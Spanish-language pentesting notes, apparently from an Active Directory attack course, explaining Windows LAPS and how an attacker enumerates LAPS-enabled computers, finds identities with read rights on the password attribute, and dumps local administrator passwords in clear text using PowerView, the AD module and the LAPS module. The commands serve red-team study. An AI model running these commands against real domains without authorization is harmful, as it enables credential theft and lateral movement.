# Windows LAPS 

Tags: #LAPS #AD #Windows 

LAPS = **Local Administrator Password Solution**. Es la solución de Microsoft a ese problema. Hace dos cosas:

1. Le pone a **cada** máquina una contraseña de admin local **distinta, larga y aleatoria**.
2. La **rota** cada cierto tiempo (por ejemplo cada 30 días).

¿Y dónde guarda esas contraseñas? Aquí está lo interesante para ti: **las guarda en Active Directory**, como un atributo del objeto computer. Ese atributo es:

- **`ms-Mcs-AdmPwd`** → en el LAPS viejo (legacy).
- **`msLAPS-Password`** → en el Windows LAPS nuevo.

### Por qué te importa como atacante

La contraseña está en AD… pero **no cualquiera puede leerla**. Solo las identidades a las que se les **delegó el permiso de lectura** sobre ese atributo. Normalmente son admins o grupos específicos.

Entonces tu juego es:

1. **Encontrar quién puede leer el atributo LAPS** → eso es exactamente lo que hace el PowerView de la lámina anterior (busca las ACEs con `ReadProperty` sobre `msLAPS-Password`).
2. Si **tú ya controlas** a uno de esos usuarios/grupos (o lo comprometes), entonces **puedes leer la contraseña LAPS en claro**.
3. Con esa contraseña, eres **admin local de esa máquina**. Entras, escalas, saqueas.

## LAPS 

* [PowerView](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)

```powershell 
Paso 1: Qué equipos del dominio tienen LAPS activo?
# Utilizando el módulo de AD
❯ Get-ADComputer -Filter * -Properties 'msLAPS-PasswordExpirationTime' | Where-Object { $_.'msLAPS-PasswordExpirationTime' -ne $null } | Select-Object Name, 'msLAPS-PasswordExpirationTime'

Paso 2: Quién puede leer la contraseña LAPS?
# Utilizando PowerView
❯ Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'msLAPS-Password') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

```powershell 
❯ Get-DomainComputer -Identity <nombre-maquina> -Properties ms-Mcs-AdmPwd

❯ Get-DomainComputer -Identity <nombre-maquina> -Properties msLAPS-Password
```


```powershell 
Paso 3: Leer la contraseña colocando el equivo con LAPS activo
# Utilizando el módulo de Active Directory 
❯ Get-LapsADPassword -Identity <nombre-equipo> -AsPlainText

# Usando el módulo de LAPS 
❯ Find-LapsADExtendedRights -Identity OUDistinguishedName    
```

```powershell 
# Utilizando PowerView 
❯ Get-DomainObject -Identity <targetmachine$> | Select-Object -ExpandProperty msLAPS-Password

# Utilizando el módulo de Active Directory 
❯ Get-ADComputer -Identity <targetmachine> -Properties msLAPS-Password | Select-Object -ExpandProperty msLAPS-Password

# Utilizando el módulo de LAPS 
❯ Get-LapsADPassword -Identity <targetmachine> -AsPlainText


NOTA: En LAPS legacy, el atributo se llama ms-Mcs-AdmPwd en vez de msLAPS-Password. Así que si el dominio es viejo, cambia el nombre del atributo en los comandos 1 y 2:

# Utilizando PowerView, legacy 
❯ Get-DomainObject -Identity <targetmachine$> | Select-Object -ExpandProperty ms-Mcs-AdmPwd

# AD module, legacy
❯ Get-ADComputer -Identity <targetmachine> -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd
```